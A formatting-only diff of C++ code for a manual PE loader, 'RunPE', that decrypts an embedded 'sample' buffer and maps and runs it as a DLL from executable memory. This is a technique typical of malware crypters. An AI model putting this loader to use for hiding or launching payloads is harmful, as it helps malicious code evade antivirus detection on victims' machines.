@@ -44,8 +44,7 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
 {
 	//START
     // Check if the DLL buffer is at least as large as the size of the DOS header.
-    if (dll_size < sizeof(IMAGE_DOS_HEADER))
-    {
+    if (dll_size < sizeof(IMAGE_DOS_HEADER)) {
         return NULL;
     }
 
@@ -53,8 +52,7 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
     const IMAGE_DOS_HEADER* dos_header = static_cast<const IMAGE_DOS_HEADER*>(dll_buffer);
 
     // Check if the DLL buffer is at least as large as the size of the NT headers.
-    if (dll_size < dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS))
-    {
+    if (dll_size < dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS)) {
         return NULL;
     }
 
@@ -62,8 +60,7 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
     const IMAGE_NT_HEADERS* nt_headers = reinterpret_cast<const IMAGE_NT_HEADERS*>(static_cast<const char*>(dll_buffer) + dos_header->e_lfanew);
 
     // Check if the DLL is a valid 32-bit or 64-bit PE file.
-    if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
-    {
+    if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
         return NULL;
     }
 
@@ -72,8 +69,7 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
 
     // Allocate memory for the DLL in the current process.
     void* image_base = VirtualAlloc((LPVOID)newBase, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (image_base == NULL)
-    {
+    if (image_base == NULL) {
         return NULL;
     }
 
@@ -81,8 +77,7 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
     const IMAGE_SECTION_HEADER* section_headers = reinterpret_cast<const IMAGE_SECTION_HEADER*>(nt_headers + 1);
 
     // Copy the section data to the allocated memory.
-    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i)
-    {
+    for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
         const IMAGE_SECTION_HEADER* section_header = section_headers + i;
         memcpy(static_cast<char*>(image_base) + section_header->VirtualAddress, static_cast<const char*>(dll_buffer) + section_header->PointerToRawData, section_header->SizeOfRawData);
     }
@@ -102,15 +97,13 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
 
     DEBUG_PRINTF("[+] Fixing imports\n");
     // Iterate through the import directory and resolve the imported functions.
-    while (import_directory->Name != 0)
-    {
+    while (import_directory->Name != 0) {
         // Get the name of the imported DLL.
         const char* import_dll_name = static_cast<const char*>(image_base) + import_directory->Name;
 
         // Load the imported DLL.
         HMODULE import_dll = LoadLibraryA(import_dll_name);
-        if (import_dll == NULL)
-        {
+        if (import_dll == NULL) {
             VirtualFree(image_base, 0, MEM_RELEASE);
             return NULL;
         }
@@ -119,11 +112,9 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
         IMAGE_THUNK_DATA* import_thunk_data = reinterpret_cast<IMAGE_THUNK_DATA*>(static_cast<char*>(image_base) + import_directory->FirstThunk);
 
         // Resolve the imported functions.
-		while (import_thunk_data->u1.AddressOfData != 0)
-		{
+		while (import_thunk_data->u1.AddressOfData != 0) {
 			// Check if the import is by ordinal
-			if (IMAGE_SNAP_BY_ORDINAL(import_thunk_data->u1.Ordinal))
-			{
+			if (IMAGE_SNAP_BY_ORDINAL(import_thunk_data->u1.Ordinal)) {
 				// Get the ordinal value
 				DWORD ordinal = IMAGE_ORDINAL(import_thunk_data->u1.Ordinal);
 
@@ -135,8 +126,7 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
 					*reinterpret_cast<void**>(import_thunk_data) = import_address;
 				}
 			}
-			else
-			{
+			else {
 				// Get the import by name
 				const IMAGE_IMPORT_BY_NAME* import_by_name = reinterpret_cast<const IMAGE_IMPORT_BY_NAME*>(static_cast<const char*>(image_base) + import_thunk_data->u1.AddressOfData);
 
@@ -164,8 +154,7 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
     DWORD delta = newBase - nt_headers->OptionalHeader.ImageBase;
 
     // Iterate through the base relocation directory and apply the relocations.
-    while (base_relocation->VirtualAddress != 0)
-    {
+    while (base_relocation->VirtualAddress != 0) {
         // Get the relocation block header.
         const WORD* relocation_block = reinterpret_cast<const WORD*>(base_relocation + 1);
 
@@ -173,8 +162,7 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
         DWORD num_relocations = (base_relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
 
         // Apply each relocation in the current block.
-        for (DWORD i = 0; i < num_relocations; ++i)
-        {
+        for (DWORD i = 0; i < num_relocations; ++i) {
             // Get the current relocation entry.
             WORD relocation_entry = relocation_block[i];
 
@@ -186,8 +174,7 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
             DWORD* reloc_address = reinterpret_cast<DWORD*>(static_cast<char*>(image_base) + base_relocation->VirtualAddress + offset);
 
             // Apply the relocation based on the type.
-            switch (type)
-            {
+            switch (type) {
             case IMAGE_REL_BASED_ABSOLUTE:
                 // The relocation is skipped if the type is absolute.
                 break;
@@ -210,8 +197,7 @@ HMODULE RunPE(const void* dll_buffer, size_t dll_size, DWORD newBase)
 
     DEBUG_PRINTF("\n[+] Calling DllMain\n");
     // Call the DLL's entry point, if it has one.
-    if (entry_point != NULL)
-    {
+    if (entry_point != NULL) {
         // Get the address of the DLL's entry point in the IAT.
         void* entry_point_iat = static_cast<char*>(image_base) + nt_headers->OptionalHeader.AddressOfEntryPoint;
 
@@ -262,13 +248,13 @@ int __stdcall WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR     lpCm
 #endif
 
     DEBUG_PRINTF("[+] Started\n");
+
     // Load the DLL from a buffer in memory
     const int bufferSize = sizeof(sample) / sizeof(sample[0]);
 
     decrypt(KEY);
     HMODULE dll = RunPE(sample, bufferSize, NEW_ADDRESS);
-    if (dll == NULL)
-    {
+    if (dll == NULL) {
         DEBUG_PRINTF("[-] Failed to load DLL\n");
         return 1;
     }
